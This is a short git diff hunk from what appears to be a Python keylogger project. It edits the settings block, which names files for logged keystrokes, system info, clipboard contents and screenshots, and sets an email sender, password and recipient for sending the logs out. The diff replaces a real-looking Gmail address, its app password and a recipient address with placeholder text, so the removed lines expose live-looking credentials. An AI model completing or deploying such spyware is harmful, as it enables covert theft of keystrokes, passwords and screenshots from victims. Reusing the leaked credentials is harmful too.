@@ -18,17 +18,17 @@ from requests import get
 from multiprocessing import Process, freeze_support
 from PIL import ImageGrab, Image
 
-file_path = "C:\\Users\\LENOVO\\Desktop\\bitskrieg\\keyloggerV1"
+file_path = "C:\\upload\\path\\to\\the\\keyloggerV1\\folder"
 extend = "\\"
 file_info = "key_log.txt"
 sys_info = "sysinfo.txt"
 clipboard_info = "clipinfo.txt"
 scinfo = "screenshot.png"
 
-email_address = "keytest762@gmail.com"
-password = "fzhyfkpzkzkqrmxq"
+email_address = "email address you are sending log files from"
+password = "pw of email"
 
-toaddress = "mewofo3604@operades.com"
+toaddress = "email to send the log info"
 
 time_itr = 15
 iterationsEnd = 3
